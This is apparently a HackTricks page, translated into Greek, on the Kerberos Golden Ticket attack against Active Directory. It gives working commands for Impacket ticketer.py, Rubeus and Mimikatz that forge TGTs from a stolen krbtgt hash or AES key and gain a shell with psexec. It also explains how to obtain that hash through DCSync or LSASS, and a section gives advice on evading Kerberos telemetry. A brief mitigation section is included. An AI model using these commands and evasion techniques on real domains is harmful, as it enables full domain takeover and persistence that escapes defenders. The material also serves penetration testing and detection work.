# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

Μια επίθεση **Golden Ticket** συνίσταται στη **δημιουργία ενός νόμιμου Ticket Granting Ticket (TGT) που υποδύεται οποιονδήποτε χρήστη** μέσω της χρήσης του **NTLM hash του λογαριασμού krbtgt του Active Directory (AD)**. Αυτή η τεχνική είναι ιδιαίτερα πλεονεκτική επειδή **επιτρέπει πρόσβαση σε οποιαδήποτε υπηρεσία ή μηχάνημα** εντός του domain ως ο χρήστης που υποδύεται. Είναι κρίσιμο να θυμάσαι ότι τα **credentials του λογαριασμού krbtgt δεν ενημερώνονται ποτέ αυτόματα**.

Για να **αποκτηθεί το NTLM hash** του λογαριασμού krbtgt, μπορούν να χρησιμοποιηθούν διάφορες μέθοδοι. Μπορεί να εξαχθεί από τη διεργασία **Local Security Authority Subsystem Service (LSASS)** ή από το αρχείο **NT Directory Services (NTDS.dit)** που βρίσκεται σε οποιοδήποτε Domain Controller (DC) μέσα στο domain. Επιπλέον, η **εκτέλεση μιας DCsync attack** είναι μια άλλη στρατηγική για την απόκτηση αυτού του NTLM hash, η οποία μπορεί να πραγματοποιηθεί χρησιμοποιώντας εργαλεία όπως το **lsadump::dcsync module** στο Mimikatz ή το **secretsdump.py script** του Impacket. Είναι σημαντικό να τονιστεί ότι για να πραγματοποιηθούν αυτές οι ενέργειες, **συνήθως απαιτούνται domain admin privileges ή αντίστοιχο επίπεδο πρόσβασης**.

Παρότι το NTLM hash αποτελεί μια βιώσιμη μέθοδο για αυτόν τον σκοπό, **συνιστάται έντονα** η **forge tickets χρήση των κλειδιών Kerberos του Advanced Encryption Standard (AES) (AES128 και AES256)** για λόγους operational security. Αυτό είναι ακόμη πιο σημαντικό σε σύγχρονα domains επειδή η χρήση του **RC4 σταδιακά καταργείται** και ξεχωρίζει πολύ πιο καθαρά στην Kerberos telemetry.
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
### Σημειώσεις σύγχρονης δημιουργίας ticket

Όταν είναι δυνατόν, **ρώτησε πρώτα το LDAP και το SYSVOL** και μετά forge το ticket χρησιμοποιώντας την πραγματική domain policy και τις τιμές PAC του χρήστη αντί να τις εφευρίσκεις χειροκίνητα:
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```
- `/ldap` ζητά από το DC τα δεδομένα του χρήστη, των groups, του NetBIOS και των policies που χρησιμοποιούνται για να χτιστεί ένα πιο ρεαλιστικό PAC.
- `/printcmd` εκτυπώνει ένα offline command line που περιέχει τα ανακτημένα PAC fields, κάτι που είναι χρήσιμο αν αργότερα θέλεις να forge το ίδιο ticket χωρίς να ξαναπιάσεις το LDAP.
- `/extendedupndns` προσθέτει τα νεότερα `UpnDns` PAC elements που περιέχουν το `samAccountName` και το account SID.
- `/oldpac` αφαιρεί τα νεότερα `Requestor` και `Attributes` PAC buffers· αυτό είναι κυρίως χρήσιμο για compatibility testing απέναντι σε παλαιότερα environments, όχι για default tradecraft.

Από Linux, οι πρόσφατες εκδόσεις του Impacket υποστηρίζουν επίσης την προσθήκη των νεότερων PAC structures και τον ορισμό ενός ρεαλιστικού validity period:
```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-user-id 500 -groups 512,513,518,519 -duration 10 \
-extra-pac administrator
```
- `-duration` είναι σε **ώρες**. Η προεπιλογή είναι **10 years**, κάτι που είναι noisy.
- `-extra-pac` προσθέτει τις νεότερες πληροφορίες PAC `UPN_DNS`.
- `-old-pac` επιβάλλει την παλαιότερη PAC διάταξη.
- `-extra-sid` είναι χρήσιμο όταν το PAC χρειάζεται επιπλέον SIDs (για παράδειγμα, σε σενάρια escalation από child-to-parent, τα οποία καλύπτονται στο [SID-History Injection](sid-history-injection.md)).

**Μόλις** έχεις κάνει **injected το golden Ticket**, μπορείς να αποκτήσεις πρόσβαση στα shared files **(C$)** και να εκτελέσεις services και WMI, οπότε θα μπορούσες να χρησιμοποιήσεις **psexec** ή **wmiexec** για να αποκτήσεις ένα shell (φαίνεται ότι δεν μπορείς να πάρεις shell μέσω winrm).

### Bypassing common detections

Οι πιο συνηθισμένοι τρόποι ανίχνευσης ενός golden ticket είναι μέσω του **inspecting Kerberos traffic** στο wire. Από προεπιλογή, το Mimikatz **signs the TGT for 10 years**, κάτι που θα ξεχωρίζει ως anomalous στα επόμενα TGS requests που θα γίνουν με αυτό.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Χρησιμοποίησε τις παραμέτρους `/startoffset`, `/endin` και `/renewmax` για να ελέγξεις το start offset, τη διάρκεια και τα μέγιστα renewals (όλα σε λεπτά).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Δυστυχώς, η διάρκεια ζωής του TGT δεν καταγράφεται στα 4769, οπότε δεν θα βρείτε αυτήν την πληροφορία στα Windows event logs. Ωστόσο, αυτό που μπορείτε να συσχετίσετε είναι το **να βλέπετε 4769 χωρίς προηγούμενο 4768**. Δεν είναι **δυνατό να ζητήσετε ένα TGS χωρίς TGT**, και αν δεν υπάρχει καταγραφή ότι εκδόθηκε TGT, μπορούμε να συμπεράνουμε ότι παραποιήθηκε offline.

Σε **νεότερα Windows builds**, τα Event IDs **4768** και **4769** εκθέτουν επίσης πολύ καλύτερη **τηλεμετρία τύπου κρυπτογράφησης**. Ένα forged TGT/TGS που χρησιμοποιεί **RC4 (`0x17`)** σε ένα domain όπου το `krbtgt`, οι clients και τα services έχουν ήδη κλειδιά AES είναι πολύ πιο εύκολο να εντοπιστεί από ό,τι πριν από μερικά χρόνια. Αυτός είναι ένας ακόμη λόγος να προτιμάτε **AES-backed Golden Tickets** και να ταιριάζετε όσο το δυνατόν περισσότερο με την κανονική Kerberos policy του domain.

Ένα άλλο θέμα OPSEC είναι η **PAC fidelity**. Tickets με αδύνατες group memberships, με ελλείποντα νεότερα PAC buffers ή με account metadata που δεν ταιριάζει με το LDAP είναι πιο εύκολο να εντοπιστούν όταν οι defenders επαληθεύουν τα PAC contents έναντι των AD δεδομένων. Αν χρειάζεστε ένα TGT που να μοιάζει σαν να εκδόθηκε πραγματικά από DC, δείτε:

{{#ref}}
diamond-ticket.md
{{#endref}}

Υπάρχουν επίσης **περιβαλλοντικοί περιορισμοί** στην persistence. Το `krbtgt` account διατηρεί ένα **password history of 2**, οπότε ένα forged TGT μπορεί να παραμείνει έγκυρο μετά το **πρώτο** `krbtgt` reset αν είχε υπογραφεί με το προηγούμενο key. Γι’ αυτό οι defenders ακυρώνουν τα Golden Tickets με **διπλό reset του `krbtgt`** και περιμένουν τουλάχιστον το μέγιστο ticket lifetime του domain ανάμεσα στα resets.

Για να **παρακάμψετε αυτό το detection** ελέγξτε τα diamond tickets.

### Mitigation

- 4624: Account Logon
- 4672: Admin Logon
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Άλλα μικρά tricks που μπορούν να κάνουν οι defenders είναι να **alert on 4769's for sensitive users** όπως το default domain administrator account και να κάνουν alert στη **χρήση RC4 για `krbtgt`** σε domains που συνήθως εκδίδουν AES tickets.

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../banners/hacktricks-training.md}}
